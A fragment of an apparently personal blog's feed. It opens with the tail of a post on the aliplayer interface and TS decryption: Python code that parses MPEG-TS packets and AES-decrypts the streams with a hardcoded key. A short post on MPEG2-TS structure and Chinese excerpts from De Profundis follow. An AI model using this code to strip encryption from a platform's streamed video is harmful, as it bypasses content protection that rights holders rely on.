class="keyword">while</span> e &lt; section_body:</span><br><span class="line">        s = (<span class="number">0x1f</span> &amp; t[e + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> t[e] == <span class="number">0x1b</span> <span class="keyword">and</span> vpid == -<span class="number">1</span>:</span><br><span class="line">            vpid = s</span><br><span class="line">        <span class="keyword">elif</span> t[e] == <span class="number">0x0f</span> <span class="keyword">and</span> apid == -<span class="number">1</span>:</span><br><span class="line">            apid = s</span><br><span class="line">        <span class="keyword">elif</span> t[e] == <span class="number">0x1c</span> <span class="keyword">and</span> mpid == -<span class="number">1</span>:</span><br><span class="line">            mpid = s</span><br><span class="line">        <span class="keyword">elif</span> t[e] != <span class="number">0x1b</span> <span class="keyword">and</span> t[e] != <span class="number">0x0f</span> <span class="keyword">and</span> t[e] != <span class="number">0x1c</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR @ &#123;1&#125;, UNKONWN STREAM TYPE: &#123;2&#125; STREAM_ID: &#123;0&#125;.&#x27;</span>.<span class="built_in">format</span>(s, e, t[e]))</span><br><span class="line">        e += <span class="number">5</span> + ((<span class="number">0x0f</span> &amp; t[e + <span class="number">3</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> vpid, apid, mpid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parsepes</span>(<span class="params">datarray: <span class="built_in">bytearray</span>, index: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    r = <span class="built_in">bytes</span>(datarray)</span><br><span class="line">    <span class="keyword">if</span> (r[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) + (r[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + r[<span class="number">2</span>] == <span class="number">0x000001</span>:</span><br><span class="line">        <span class="keyword">if</span> (r[<span class="number">4</span>] &lt;&lt; <span class="number">8</span>) + r[<span class="number">5</span>] &gt; <span class="built_in">len</span>(r) - <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        pes_header_data_length = r[<span class="number">8</span>] + <span class="number">9</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> index.items():</span><br><span class="line">            index[key] += pes_header_data_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> r[pes_header_data_length:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doset</span>(<span class="params">decdata: <span class="built_in">bytes</span>, index: <span class="built_in">dict</span>, tsarray: <span class="built_in">bytearray</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j, start <span class="keyword">in</span> index.items():</span><br><span class="line">        end = <span class="built_in">min</span>(j + <span class="number">0xbc</span>, start + <span class="built_in">len</span>(decdata) - v)</span><br><span class="line">        length = end - start</span><br><span class="line">        tsarray[start:end] = decdata[v:v + length]</span><br><span class="line">        v += length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">datarray: <span class="built_in">bytearray</span>, index: <span class="built_in">dict</span>, tsarray: <span class="built_in">bytearray</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    data = parsepes(datarray, index)</span><br><span class="line">    key = b64decode(key)</span><br><span class="line">    encdata = data[<span class="number">0</span>:<span class="built_in">len</span>(data) - <span class="built_in">len</span>(data) % <span class="number">16</span>]</span><br><span class="line">    decdata = AES.new(key, AES.MODE_ECB).decrypt(encdata)</span><br><span class="line">    doset(decdata, index, tsarray)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dects</span>(<span class="params">filename: <span class="built_in">str</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    tsfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    ts = <span class="built_in">bytearray</span>(tsfile.read())</span><br><span class="line">    tsfile.close()</span><br><span class="line"></span><br><span class="line">    sdtid = <span class="number">0x0011</span></span><br><span class="line">    nulid = <span class="number">0x1fff</span></span><br><span class="line">    patid = <span class="number">0x0000</span></span><br><span class="line">    pmtid = vpid = apid = mpid = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    vdata = <span class="built_in">bytearray</span>()</span><br><span class="line">    adata = <span class="built_in">bytearray</span>()</span><br><span class="line">    mdata = <span class="built_in">bytearray</span>()</span><br><span class="line">    vindex = &#123;&#125;</span><br><span class="line">    aindex = &#123;&#125;</span><br><span class="line">    mindex = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ts), <span class="number">0xbc</span>):</span><br><span class="line">        <span class="keyword">if</span> ts[i] != <span class="number">0x47</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR@ &#123;0&#125;, NOT START WITH 0x47.&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="number">0x40</span> &amp; ts[i + <span class="number">1</span>]</span><br><span class="line">        adap = (<span class="number">0x30</span> &amp; ts[i + <span class="number">3</span>]) &gt;&gt; <span class="number">4</span></span><br><span class="line">        pid = ((<span class="number">0x1f</span> &amp; ts[i + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ts[i + <span class="number">2</span>]</span><br><span class="line">        d = <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> adap == <span class="number">0b00</span> <span class="keyword">or</span> adap == <span class="number">0b01</span>:</span><br><span class="line">            d = i + <span class="number">0x04</span></span><br><span class="line">        <span class="keyword">elif</span> adap == <span class="number">0b10</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> adap == <span class="number">0b11</span>:</span><br><span class="line">            d = i + <span class="number">0x04</span> + <span class="number">0x01</span> + ts[i + <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pid == sdtid <span class="keyword">or</span> pid == nulid:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> pid == patid:</span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                d += ts[d] + <span class="number">1</span></span><br><span class="line">            pmtid = (<span class="number">0x1f</span> &amp; ts[d + <span class="number">10</span>]) &lt;&lt; <span class="number">8</span> | ts[d + <span class="number">11</span>]</span><br><span class="line">        <span class="keyword">elif</span> pid == pmtid:</span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                d += ts[d] + <span class="number">1</span></span><br><span class="line">            vpid, apid, mpid = parsepmt(ts, d, vpid, apid, mpid)</span><br><span class="line">        <span class="keyword">elif</span> pid == vpid:</span><br><span class="line">            <span class="keyword">if</span> payload <span class="keyword">and</span> vdata:</span><br><span class="line">                decrypt(vdata, vindex, ts, key)</span><br><span class="line">                vdata = <span class="built_in">bytearray</span>()</span><br><span class="line">                vindex = &#123;&#125;</span><br><span class="line">            vdata += <span class="built_in">bytearray</span>(ts[d:i + <span class="number">0xbc</span>])</span><br><span class="line">            vindex[i] = d</span><br><span class="line">        <span class="keyword">elif</span> pid == apid:</span><br><span class="line">            <span class="keyword">if</span> payload <span class="keyword">and</span> adata:</span><br><span class="line">                decrypt(adata, aindex, ts, key)</span><br><span class="line">                adata = <span class="built_in">bytearray</span>()</span><br><span class="line">                aindex = &#123;&#125;</span><br><span class="line">            adata += <span class="built_in">bytearray</span>(ts[d:i + <span class="number">0xbc</span>])</span><br><span class="line">            aindex[i] = d</span><br><span class="line">        <span class="keyword">elif</span> pid == mpid:</span><br><span class="line">            <span class="keyword">if</span> payload <span class="keyword">and</span> mdata:</span><br><span class="line">                decrypt(mdata, mindex, ts, key)</span><br><span class="line">                mdata = <span class="built_in">bytearray</span>()</span><br><span class="line">                mindex = &#123;&#125;</span><br><span class="line">            mdata += <span class="built_in">bytearray</span>(ts[d:i + <span class="number">0xbc</span>])</span><br><span class="line">            mindex[i] = d</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR @ &#123;0&#125;, &#123;1&#125; IS NOT A VALID PID.&#x27;</span>.<span class="built_in">format</span>(i, pid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(vdata) != <span class="number">0</span>:</span><br><span class="line">        decrypt(vdata, vindex, ts, key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(adata) != <span class="number">0</span>:</span><br><span class="line">        decrypt(adata, aindex, ts, key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(mdata) != <span class="number">0</span>:</span><br><span class="line">        decrypt(mdata, mindex, ts, key)</span><br><span class="line"></span><br><span class="line">    decfile = <span class="built_in">open</span>(<span class="string">&#x27;dec&#x27;</span> + filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    decfile.write(ts)</span><br><span class="line">    decfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     for filenum in range(29):</span></span><br><span class="line"><span class="comment">#         dects(str(filenum) + &#x27;.ts&#x27;, b&#x27;Okrb/FBF+uFjevMGP0uyLA==&#x27;)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">aliplayer 接口分析与 TS 文件解密。</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://yzctzl.github.io/tags/Web/"/>
    
    <category term="JS" scheme="https://yzctzl.github.io/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>TS 文件结构概述</title>
    <link href="https://yzctzl.github.io/2021/MPEG2_TS/"/>
    <id>https://yzctzl.github.io/2021/MPEG2_TS/</id>
    <published>2021-04-11T16:00:00.000Z</published>
    <updated>2021-04-11T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>仔细阅读文档 H.222.0 中的 2.4.3 和 2.4.4 两节，以及 DVB 中的 5 章。</p><h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>每个 ts 文件都是由固定大小的 0xbc 长度的包构成的。也有其他尺寸，暂不讨论。<br>每个包的前四个字节被称为 header，保存着的主要信息有：payload, PID, adaptation_field, counter。<br>PID 表示包中的内容类型，主要有：SDT, PAT, PMT。<br>其中 PMT 包含着音频和视频的 PID，而 PAT 中包含着 PMT 的 PID，PAT_PID &#x3D;&#x3D; 0x0000。<br>payload 如果为 1，表示有 PES 负载，长度为 pointer。<br>adaptation_field 主要用于填充包，填充的内容固定为 0xFF。<br>一般而言，音频和视频帧都很大，所以需要切割成很多份，往往在某一帧开头的时候会有 PES 。<br>在 PES 之后就是真正的 AVC AAC 流了。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><h3 id="TS-PMT"><a href="#TS-PMT" class="headerlink" title="TS + PMT"></a>TS + PMT</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/MPEG2_TS/TS.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/MPEG2_TS/TS.png" class="lazyload" data-srcset="/img/2021/MPEG2_TS/TS.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h3 id="PES"><a href="#PES" class="headerlink" title="PES"></a>PES</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/MPEG2_TS/PES.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/MPEG2_TS/PES.png" class="lazyload" data-srcset="/img/2021/MPEG2_TS/PES.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>]]></content>
    
    
    <summary type="html">概述 MPEG2 TS 文件结构</summary>
    
    
    
    <category term="AV" scheme="https://yzctzl.github.io/categories/AV/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="HLS" scheme="https://yzctzl.github.io/tags/HLS/"/>
    
    <category term="TS" scheme="https://yzctzl.github.io/tags/TS/"/>
    
  </entry>
  
  <entry>
    <title>《自深深处》摘录</title>
    <link href="https://yzctzl.github.io/2021/Notes/%E8%87%AA%E6%B7%B1%E6%B7%B1%E5%A4%84/"/>
    <id>https://yzctzl.github.io/2021/Notes/%E8%87%AA%E6%B7%B1%E6%B7%B1%E5%A4%84/</id>
    <published>2021-03-24T16:00:00.000Z</published>
    <updated>2021-03-24T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>我不夸大其词，而是绝对实事求是地要你知道，在我们相处的那个时候，我一行东西都没写。无论是在托基、戈灵、伦敦、佛罗伦萨，还是其他地方，只要你在身旁，我就才思枯竭，灵感全无，而除了那么几次以外，我很遗憾地说，你总是呆在我身旁。</p><p>但是我最怪自己的，是让你使我的道德完全堕落。性格的根基在于意志力，而我的意志力却变得完全臣服于你。听起来不可思议，但却是千真万确。那些接二连三的吵闹折腾，在你几乎是出于肉体的需要，可同时又使你的心灵和肉体扭曲，让你变成一个别人不敢听不敢看的怪物；你从你父亲那儿继承的那种可怕的狂躁，使你写出令人恶心的书信；你对自己的感情完全失去控制，要么郁郁寡欢长久的不言不语，要么如癫痫发作似的突然怒发冲冠。</p><p>这些就是我为什么会对你与日俱增的索求作出致命让步的根源所在。你会把人磨垮的。这是小的胜过大的。这是弱者的暴政压过了强者，在一出剧本的什么地方我说过这是“唯一历久不衰的暴政”。</p><p>而这又是无可避免的。生活里，每一种人际关系都要找着某种相处之道。与你的相处之道是，要么全听你的要么全不理你，毫无选择余地。</p><p>我对自己心理的估计大错特错了。我总以为小事上对你迁就没什么，大事临头时我会重拾意志力，理所当然地重归主宰地位。情形并非这样。大事临头时我的意志力全垮了。生活中说真的是分不出大事小事的。凡事大小轻重都一样。</p><p>只要稍稍提及我面临的严峻处境你就心烦，还不如人家向我们推荐的新牌香槟更让你感兴趣。</p><p>归根结底一切人际交往的纽带，不管是婚姻还是友谊，都是交谈，而交谈必须有一个共同的基础。如果双方的文化教养迥异，那唯一可能的共同基础只能建立在最低的层面上。思想和行为上的琐屑讨人喜欢。</p><p>我们在一起已经有十二个星期了，我需要休息，需要从与你相处那可怕的压力下解脱出来。我有必要自己一个人呆一阵子。是心智上的必要。</p><p>记得我第二天回到伦敦，坐在房间里悲伤而又认真地思索着，你到底是不是我认为的那样，全是可怕的缺点，对己对人都是祸害一个，同你相处甚至相识，就要酿成致命之祸。</p><p>不再跟你打交道我觉得很泰然。我决心已定，愉快地把自己献给艺术，那曾经让你把它给打断了的艺术。</p><p>三年了，要你回想可真是个不短的时间。但对我们这些在监牢里度日的人们，生活中不见人间的动静而只有悲哀，只能以肌体跳痛的顿挫、内心悲苦的短长来度量时日。我们没别的好想了。</p><p>用不着提醒你，当时我是怎样地伺候照顾你，不只是源源不断的水果鲜花、礼物书籍诸如此类用钱买得到的东西，还有那份感情、那份亲切、那份爱，不管你怎么想这些都是用钱买不来的。除了上午一个小时散步，下午一个小时驾车出去，我从未离开过旅馆。</p><p>我知道，从今往后我的艺术和生活不管在哪方面都将更自由、更美、更好？虽病体虚弱，但内心舒畅。分手是义无返顾了，这使我觉得安宁平静。</p><p>在桌上放着的电报书信中有一封你手书的信。我怀着一份伤感将它打开，心里知道自己再也不会因为一句好话、一句感人的话、一句哀愁的话而容你回来。可我完全上当了。我低估了你。你在我生日当天寄来的信是对前两场吵闹淋漓尽致的重复，处心积虑地、狡猾地写成白纸黑字！你用粗俗的嘲弄取笑我。</p><p>在这万千思绪百般情感的交汇之下，汹涌在我脑海中的便是对你及你家人的无限同情。对你的愤懑和怨恨我忘了。</p><p>我们的友谊真正是始自你的一封可怜又可爱的信，求我在危急之中助你一把。</p><p>如此不断地掏钱，当然主要掏的是我的钱，但我知道也令你母亲破了些财，从来没有这样令人心烦过，因为在我这儿，无论怎么说，从来就没听过起码是小小的一声道谢，或是见过一点适可而止的表示。</p><p>我呢，也有我的幻想。我以为生活会是一出绝妙的喜剧，而你会是剧中一个风雅备至的人物。后来却发现它原来是一个令人反感、令人恶心的悲剧。而带来大灾难的险恶祸端，其险其恶在于苦心孤诣、志在必得，就是剥去了欢娱和喜乐面具的你本人。那面具不但骗了我，也骗了你误入歧途。</p><p>还有某种东西，某种对你的奇怪的吸引力：你爱我远胜过爱别的什么人。但是你，同我一样，生活中也有过可怕的悲剧，虽然二者之悲，完全不同。想知道这是什么吗？这就是，你的心中恨总是比爱强烈。</p><p>你想象力缺乏得可怕，这是你性格上唯一真正致命的缺点，而这又是你心中的仇恨造成的。不知不觉地、悄悄地、暗暗地，仇恨啃咬着你的人性，就像苔藓咬住植物的根使之萎黄，到后来眼里装的便只有最琐屑的利益和最卑下的目的。你那本来可以通过爱来扶植的才智，已经被仇恨毒化而萎蔫了。</p><p>你本该做的事并不难，也很清楚地摆在面前，但是仇恨蒙蔽了你的眼睛，使你什么也看不到。</p><p>你看到我不得不把你的生活写出来给你，而你非得领悟它不可。</p><p>恶大莫过于浮浅。</p><p>至是看到我被锁在木制囚笼中，也无法唤醒你那死去的、没有想象力的心性。</p><p>仇恨，你还不知道呢，以心智论是永恒的否定，以感情论是萎缩退化的一种形式，它消灭一切，除了自己。</p><p>这一切在你眼里一钱不值。你说这无聊透了，就这样。</p><p>肉体之罪算不了什么。如果该治的话，也是留给医生诊治的疾患。只有灵魂之罪才是可耻的。假使通过这种手段使自己获判无罪，对于我将是永生的折磨。但是你真的就认为自己配得上我那时对你表示的爱吗？真的就认为我有哪一刻觉得你配得上吗？你真的就认为在我们的友谊之中，有哪一段时期你配得上我对你表示的爱吗？真的就认为我有哪一刻觉得你配得上吗？我知道你配不上的。但爱不在市场上交易，也不用小贩的秤来称量。爱的欢乐，一如心智的欢乐，在于感受自身的存活。爱的目的是去爱，不多，也不少。你是我的敌人，从来没有谁有过像这样的敌人。我曾把自己的生命给了你，然而为了满足一己私欲，那人情人性中最低下最可鄙的欲望——仇恨、虚荣还有贪婪——你把它丢弃了。</p><p>我坐在自己灿烂生活的废墟中，痛苦使我肝胆俱裂，恐惧使我不知所措，疼痛又令我眼冒金星。但我不会恨你的。每天我都对自己说：“今天我必须把爱留存心间，否则这一天怎么过？”我提醒自己说你是不怀恶意的，不管怎样，对我是不怀恶意的。</p><p>即使在那黑暗的日子里，那些我一生中最黑暗的日子里，也有些时候我当真渴望能去安慰你，那样确信你终于领悟到了自己的所作所为。我那时没想到，你会有这一大恶——浮浅。</p><p>百合花王子！我看到了——而以后的事情说明我没看错——所发生的这一切，丝毫没让你有一丁点的领悟。你在自己眼里仍然是一出小喜剧中风度翩翩的王子，而非一出悲剧演出中忧郁伤心的人物。</p><p>只有你，冷眼旁观，没传来一句话，没寄来一封信。卫基尔对但丁说起那些没有高尚的冲动也没有深远的意向的人，像你的这种样子，用他的话最好说了：“别提他们，只用眼睛看，再走过去。”</p><p>你毁了一个像我这样的人，但我不能让你心头压着这负担过一辈子。这负担可能会使你变得麻木冷酷，或者凄凄惨惨。我必须把这重负从你心头举起，放上我自己的肩头。我必须告诉自己，不管是你还是你父亲，即使再强大千百倍，也不可能摧毁一个像我这样的人；是我自己毁了自己——不管是大人物还是小人物，如果不是自己毁自己，别人谁也毁不了的。</p><p>在高峰顶上呆腻了，便成心下到谷底，寻求新的刺激。<br>我忘了，日常生活中每一个细小的行为都能培养或者败坏品格，因此，一个人在暗室里干的事，总有一天要在房顶上叫嚷出去的。</p><p>现在我发现，藏在我心性深处有什么东西在告诉我，世界上没有什么是无意义的，而受苦是最不可能没有意义的。这个东西藏在我心性的深处，就像野地里的宝藏。它就是谦卑。<br>天下万物唯有它最奇怪。给别人不行，别人要给你也给不了。想获得它也不行，除非把自己已有的东西全都放弃。只有在失去了一切之后，才能知道自己拥有它。</p><p>我远比以往任何时候都更是个有主见的自为主义者。除非出自本人，否则任你什么东西，对我一点价值也没有。</p><p>在艺术中，人只关心一个特定的事物在一个特定的瞬间对自己来说是什么；在人性格的道德进化中也一样。<br>对肉体的每一丁点降格，我都必须设法变成灵魂的精神升华。</p><p>刚进监狱时，有些人劝我忘掉自己是谁。要听了这话就完了。只有领悟了自己是什么人，我心中才有安宁可言。</p><p>神是奇怪的，他们惩罚我们，不但因为我们的恶行和堕落变态，也因为我们的美好与善良。就这一点，我必须接受的事实是，一个人受惩罚，不但因为他作的恶，也因为他行的善。</p><p>我要教会自己的事有一件就是：别因此而羞愧。我必须接受这是一个惩罚；假如因为受到惩罚而羞愧，那惩罚受了就跟从来没受过一样。不因为受过惩罚而羞愧，是必须首先达到的境界之一，为了我自己能臻于完美，也因为我是如此的不完美。</p><p>接着我必须学会快乐。我一度凭直觉懂得快乐，或者以为自己懂得快乐。</p><p>受苦其实是一种启示，让人明白以前从未明白的事理，让人从一个新的立足点去思考整个历史。关于艺术，过去凭直觉隐隐约约感到的东西，现在以心智和感情领悟了，再清晰不过地洞察了，刻骨铭心地体味了。</p><p>欢乐与欢笑背后可能藏着一种性情，一种粗俗、刻薄、冷酷的性情。但悲怆的背后却永远是悲怆。痛苦，不像痛快，是不戴面具的。</p><p>艺术的真实是事物同其本身的整合，达成的外形表达着内涵，使灵魂获得肉身，使肉体充满精神。基于这个理由，就不存在能与悲怆相提并论的真实。</p><p>而如果真的像我所说万象是用悲怆建造的，那造出这一切的是爱的双手。因为没有别的什么途径，能让万象为之而设的人的灵魂达到至善至美的境界。痛快享乐，是为了美好的肉体；而痛苦伤心，则是为了美好的灵魂。</p><p>那个人不得不用铸《快乐如过眼烟云》塑像的青铜去铸《悲怆地久天长》的塑像，这预示就铸成了具象。不可能会是别的了。在一个人的生命中，每时每刻的做人，不但取决于他曾经怎样，也同样取决于他即将怎样。</p><p>倘若我能完全达致这一境界，那就是艺术生命的终极感悟。因为艺术生命是简单的自我发展。艺术家的谦卑在于他对所有经验的坦诚接受，正如艺术家的爱无非是那份对美的感受，那份向世界揭示其灵与肉的美感。</p><p>无论艺术家的气质还是耶稣的真谛，都会教你怎样对别人的遭遇感同身受。</p><p>当人同灵魂相交时，就变得像小孩一样单纯，正如基督所要的那样。埃默森说过，“最难得的莫过于出自本人的行为。”这话还真不假。大多数人都是别人的人。他们的思想是别人的想法，他们的生活是对别人的模仿，他们的激情是袭人牙慧的情感。</p><p>艺术的真谛即是“外形表达着内涵；使灵魂获得肉身，使肉体充满精神；以形式揭示内容”</p><p>大部分人活着是为了爱和赞美。但我们应该是凭借爱和赞美活着。每个人都配得到爱，除了那些自认为配得到爱的人。</p><p>这是因为想象说到底就是爱的一种表现，而是爱，是爱心的大小，把世人一个个区别开来。</p><p>虽说提出要做一个更好的人是句不科学的空话，成为一个更深刻的人，则是受过苦的那些人的特权。我想我是变深刻了。</p><p>假如出去后，哪位朋友设宴而不请我，我一点也不会介意。一个人我就可以快乐无边了。</p><p>能看着世界的可爱，又同时分担它的悲哀，并领悟两者的奇妙，这样的人已是直通神性，与上帝的真意再接近不过了。</p><p>记得过去常说过，要是一个真正的悲剧临到我身上，我想自己也受得了，只要它裹着紫色的罩布、戴着高尚的悲怆面具；但现代性可怕的一点是，它把悲剧裹上了喜剧的外衣，这样一来，伟大的现实似乎成了或陈腐或丑怪或俚俗的东西。据说在旁观者看来，一切殉道的壮举都显得贱。</p><p>要是生活还留给我任何的美好，那也许就包含在某个屈服、落魄和羞辱的瞬间。</p><p>可爱的人们如渔夫、牧人、农民之辈，他们一点也不懂得艺术，可正是人群中的佼佼者。是市侩庸人的，倒是那些坚持并襄助社会那笨重冥顽、盲目机械的力量，而对一个人或一项运动的内在活力视而不见的人。</p><p>他对你本该是一个儆戒，怎么反而成了你的典范，解释除非是大凡两个人有了仇隙，其间必定存在某种难兄难弟的纽带，某种同气相求的呼应。</p><p>在艺术上，好的动机一点价值也没有。所有不好的艺术都是好的动机造成的。</p><p>我多么讨厌你把我当成个“有用的”人，搞艺术的多么不喜欢被人这么看，这么对待；艺术家，如同艺术本身，就其本质而言是很没用的。这话你听了常常大发脾气。真话总是让你生气。</p><p>一个人没有理由非得把自己的生活向全世界公开。世界是不明白事理的。但是对那些你想博得他们关爱的人，就不同了。</p><p>可你无权要求我为你承办诸如此类的宴乐。这表明你毫无眼光来真正欣赏我的才华。</p><p>伟大的激情是留给伟大的灵魂的，伟大的事件只有与之水平相当的人才能理解。</p><p>他们这些类型的人什么时候都应时应景。谴责他们反而显得缺乏欣赏力了。他们只不过是逸出了自己的范围，如此而已。灵魂的崇高是无法蔚成风气的。高远的思想，高尚的情感，从来就和者乏人。</p><p>我们称我们的时代为注重实用的时代，可没有一样东西的用途弄得明白。我们的艺术关注的是月亮，玩的是影子，而古希腊的艺术关注的是太阳，处理的是实体。</p><p>在过去，你我之间总有一道鸿沟，由于艺术和修养的高下而产生的鸿沟；而现在，横在我们之间有一道更深的鸿沟，那是悲怆的鸿沟。但是，只要心怀谦卑，就万事可成，只要心里有爱，也就天下无难事了。 </p>]]></content>
    
    
    <summary type="html">我人生有两大转折点：一是父亲送我进牛津，一是社会送我进监狱。</summary>
    
    
    
    <category term="节选" scheme="https://yzctzl.github.io/categories/%E8%8A%82%E9%80%89/"/>
    
    
    <category term="节选" scheme="https://yzctzl.github.io/tags/%E8%8A%82%E9%80%89/"/>
    
    <category term="名著" scheme="https://yzctzl.github.io/tags/%E5%90%8D%E8%91%97/"/>
    
  </entry>
  
</feed>
